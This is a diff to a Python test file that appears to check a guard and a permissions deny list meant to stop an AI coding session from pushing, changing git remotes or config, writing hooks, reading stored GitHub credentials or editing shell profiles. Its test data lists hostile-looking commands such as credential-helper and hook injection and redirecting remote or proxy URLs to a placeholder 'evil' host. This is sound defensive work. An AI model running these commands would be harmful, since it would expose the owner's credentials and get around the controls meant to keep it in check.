@@ -93,8 +93,22 @@ def test_org_chart_members_exist():
 def test_settings_deny_approval_push_and_the_assistant_stores():
     deny = json.loads((CLAUDE / "settings.json").read_text())["permissions"]["deny"]
     assert {"Bash(reema approve:*)", "Bash(reema reject:*)", "Bash(reema publish:*)",
-            "Bash(python3 scripts/dev.py run publish:*)", "Bash(git push:*)",
+            "Bash(python3 scripts/dev.py run publish:*)", "Bash(git push:*)", "PowerShell(git push:*)",
             "Read(./output/assistant/**)"} <= set(deny)
+
+
+def test_settings_have_no_push_exception_and_deny_remote_and_git_settings():
+    """Khalid, Nov 14, 2026: no ask rule or allow rule lets a session push; the broad deny stays."""
+    permissions = json.loads((CLAUDE / "settings.json").read_text())["permissions"]
+    assert "ask" not in permissions and "allow" not in permissions
+    deny = set(permissions["deny"])
+    assert {"Bash(git push:*)", "PowerShell(git push:*)"} <= deny
+    for tool in ("Bash", "PowerShell"):
+        assert {f"{tool}(git remote {verb}:*)" for verb in ("add", "set-url", "remove", "rm", "rename")} <= deny
+        assert {f"{tool}(git config {key}.*)" for key in ("remote", "push", "branch")} <= deny
+        assert {f"{tool}(git config * {key}.*)" for key in ("remote", "push", "branch")} <= deny
+    assert {"Edit(./.git/config)", "Write(./.git/config)", "Edit(**/.git/config)", "Write(**/.git/config)",
+            "Edit(~/.gitconfig)", "Write(~/.gitconfig)"} <= deny
 
 
 def test_settings_deny_remotes_publishing_deploys_network_and_protected_folders():
@@ -192,6 +206,128 @@ def test_guard_blocks_push_remotes_publish_deploy_network_and_protected_paths(co
 ])
 def test_guard_allows_local_work_and_package_installs(command):
     assert _guard().reason(command) is None
+
+
+PUSHES_STILL_BLOCKED = [
+    "git push", "git push origin", "git push origin main --force", "git push -f origin main",
+    "git push --force-with-lease origin main", "git push origin +main", "git push origin main:main",
+    "git push origin main:other", "git push origin :main", "git push origin other", "git push origin HEAD",
+    "git push --mirror origin", "git push --all origin", "git push --tags origin", "git push origin --tags",
+    "git push --delete origin main", "git push -d origin x", "git push -o ci.skip origin main",
+    "git push --repo=origin main", "git push other main", "git push origin main main",
+    "git -c remote.origin.mirror=true push origin main", "git -C proj push origin main",
+    "git --git-dir=x push origin main", "GIT_DIR=x git push origin main", "env git push origin main",
+    "sh -c 'git push origin main'", "bash -c \"git push origin main\"", "eval git push origin main",
+    "git status && git push origin main", "git push origin main; git status", "git push origin main | cat",
+    "cd proj && git push origin main", " git push origin main", "git push origin main ", "git  push origin main",
+    "git push origin main\n", "git push 'origin' main", "git.exe push origin main", "/usr/bin/git push origin main",
+]
+
+
+@pytest.mark.parametrize("command", PUSHES_STILL_BLOCKED + ["git push origin main"])
+def test_every_push_is_blocked(command):
+    """Khalid, Nov 14, 2026: the push stays manual (SEC-97/98: a session-run push was not adopted)."""
+    assert _guard().reason(command) and _guard().reason(command, powershell=True)
+
+
+@pytest.mark.parametrize("command", [
+    "git config remote.origin.url https://evil", "git config --local remote.origin.pushurl x",
+    "git config set remote.origin.mirror true", "git config push.default matching",
+    "git config branch.main.remote other", "git config url.https://evil/.pushInsteadOf https://github.com/",
+    "git config include.path x", "git config includeIf.gitdir:x.path y", "git config --global push.followTags true",
+    "git config --get remote.origin.url", "echo x >> .git/config", "cat .git/config",
+    "type .git\\config", "notepad ~/.gitconfig", "sh -c 'git config remote.origin.url x'",
+    # SEC-90 / SEC-91: any other config change, and any path through .git
+    "git config core.hooksPath x", "git config --global credential.helper store", "git config http.proxy x",
+    "git config --add core.fsmonitor x", "git config --unset user.name", "git config -e", "git config user.name x",
+    "echo x > .git/hooks/pre-push", "cp evil .git/hooks/pre-push", "cd .git && echo x > hooks/pre-push",
+    "cd .git", "ls .git", "echo D:/elsewhere > .git/commondir", "copy evil \"D:\\Projects\\IT Consultant\\.git\\hooks\"",
+    "git -C . remote rename origin old", "git remote remove origin", "git remote rm origin",
+    # SEC-93: the stored GitHub sign-in
+    "git credential fill", "printf 'host=github.com' | git credential fill", "git credential-manager get",
+    "git-credential-manager get", "git-credential-manager.exe get", "git credential-store get",
+    "bash -c 'git credential fill'",
+    # SEC-92: profiles and persistent environment
+    "echo export GIT_DIR=x >> ~/.bashrc", "cat ~/.bash_profile", "echo x > ~/.profile",
+    "Add-Content $PROFILE 'x'", "notepad Microsoft.PowerShell_profile.ps1", "setx GIT_DIR x",
+    "[Environment]::SetEnvironmentVariable('GIT_DIR','x','User')",
+    "Set-ItemProperty HKCU:\\Environment -Name GIT_DIR -Value x",
+])
+def test_git_settings_hooks_credentials_and_profiles_are_blocked(command):
+    assert _guard().reason(command) and _guard().reason(command, powershell=True)
+
+
+@pytest.mark.parametrize("command", ["git config user.name", "git config --get core.autocrlf", "git config --list",
+                                     "git config --global --get user.email", "git remote -v", "git status",
+                                     "git log origin/main..main --oneline", "cat .gitignore", "ls .github",
+                                     "git branch --show-current",
+                                     "echo https://github.com/Khalidharbi1991/REEMA.git"])
+def test_ordinary_git_still_runs(command):
+    assert _guard().reason(command) is None
+
+
+def test_git_folders_and_profiles_cannot_be_written_with_the_file_tools():
+    guard = _guard()
+    for path in (str(ROOT / ".git" / "config"), str(Path.home() / ".gitconfig"), "D:/x/.git/config",
+                 str(ROOT / ".git" / "hooks" / "pre-push"), str(ROOT / ".git" / "commondir"),
+                 str(ROOT / "apps" / ".GIT" / "x"), str(Path.home() / ".bashrc"), str(Path.home() / ".bash_profile"),
+                 str(Path.home() / "Documents" / "PowerShell" / "Microsoft.PowerShell_profile.ps1"),
+                 str(Path.home() / "OneDrive" / "Documents" / "WindowsPowerShell" / "profile.ps1")):
+        assert guard.write_reason({"file_path": path}, None), path
+    for path in (ROOT / "docs" / "config.md", ROOT / ".gitignore", ROOT / ".github" / "x.yml", ROOT / "profile.md"):
+        assert guard.write_reason({"file_path": str(path)}, None) is None, path
+
+
+def test_settings_deny_git_folders_credentials_and_profiles():
+    deny = set(json.loads((CLAUDE / "settings.json").read_text())["permissions"]["deny"])
+    assert {"Edit(**/.git/**)", "Write(**/.git/**)", "Edit(./.git/**)", "Write(./.git/**)",
+            "Bash(git credential:*)", "PowerShell(git credential:*)", "Bash(git-credential-manager:*)",
+            "Bash(setx:*)", "Edit(~/.bashrc)", "Write(~/.bashrc)", "Edit(~/.bash_profile)", "Write(~/.profile)",
+            "Edit(**/*profile.ps1)", "Write(**/*profile.ps1)", "Edit(~/.config/git/**)"} <= deny
+
+
+SEC102_BLOCKED = [
+    # one-off git settings on any git command, not only push and config
+    "git -c credential.helper=!evil fetch", "git -c credential.helper= -c credential.helper=x pull",
+    "git -c core.sshCommand=evil ls-remote origin", "git -c http.proxy=http://evil fetch origin",
+    "git -c alias.x=push x origin main", "git -c remote.origin.url=x fetch", "git -ccredential.helper=x fetch",
+    "git --config-env=credential.helper=VAR fetch", "git --config-env credential.helper=VAR fetch",
+    "git -C . -c http.extraHeader=x clone https://github.com/x/y", "sh -c 'git -c core.askPass=x fetch'",
+    "git -c url.https://evil/.insteadOf=https://github.com/ fetch",
+    # variables in front of a command, through env/export/set, or PowerShell's $env:
+    "GIT_TRACE_CURL=1 git fetch", "GIT_CURL_VERBOSE=1 git ls-remote origin", "GCM_TRACE=1 git fetch",
+    "GIT_ASKPASS=evil git fetch", "GIT_SSH_COMMAND=evil git fetch", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=x git fetch",
+    "GIT_CONFIG_PARAMETERS=x git pull", "env GIT_TRACE=1 git fetch", "export GIT_TRACE=1; git fetch",
+    "export GIT_TRACE=1 && git fetch", "declare -x GIT_DIR=x", "typeset -x GIT_DIR=x", "set GIT_TRACE=1",
+    "HTTPS_PROXY=http://evil git fetch", "https_proxy=x git fetch", "ALL_PROXY=x git fetch",
+    "SSL_CERT_FILE=x git fetch", "CURL_CA_BUNDLE=x git fetch", "BASH_ENV=x bash -c 'git fetch'",
+    "ENV=x sh -c 'git fetch'", "GIT_EDITOR=x GIT_TRACE=1 git fetch", "printf -v GIT_TRACE 1",
+    "read GIT_DIR < x", "GIT_DIR+=x git status",
+    "$env:GIT_TRACE = 1; git fetch", "$env:GCM_TRACE='1'", "Set-Item env:GIT_ASKPASS evil",
+    "New-Item -Path env:\\GIT_TRACE -Value 1", "${env:GIT_TRACE} = 1",
+    # git's lower-level commands that push without the word push
+    "git send-pack https://github.com/x/y main", "git http-push https://github.com/x/y main",
+    "git remote-https origin https://github.com/x/y", "git remote-ext x y", "git receive-pack .",
+    "git-send-pack https://github.com/x/y main", "git-http-push x", "git-remote-https origin x",
+    "\"C:/Program Files/Git/mingw64/libexec/git-core/git-send-pack.exe\" x main",
+]
+
+
+@pytest.mark.parametrize("command", SEC102_BLOCKED)
+def test_one_off_git_settings_risky_variables_and_push_plumbing_are_blocked(command):
+    """SEC-102: the repository is private, so any git command that reaches GitHub uses Khalid's sign-in."""
+    guard = _guard()
+    assert guard.reason(command) or guard.reason(command, powershell=True), command
+
+
+@pytest.mark.parametrize("command", [
+    "git fetch", "git fetch origin", "git pull", "git ls-remote origin", "git clone https://github.com/x/y",
+    "git -C apps/snafi-web status", "git log -c --oneline", "git diff -c HEAD~1", "FOO=1 git status",
+    "GIT_EDITOR=true git commit -q -F msg.txt", "GIT_PAGER=cat git log -1", "NO_PROXY=x npm test",
+    "echo $GIT_EDITOR", "python scripts/dev.py test -q", "git commit -q -m 'Read the docs'",
+])
+def test_ordinary_git_and_harmless_variables_still_run(command):
+    assert _guard().reason(command) is None, command
 
 
 def test_guard_finds_new_home_in_the_home_design_team_folder():
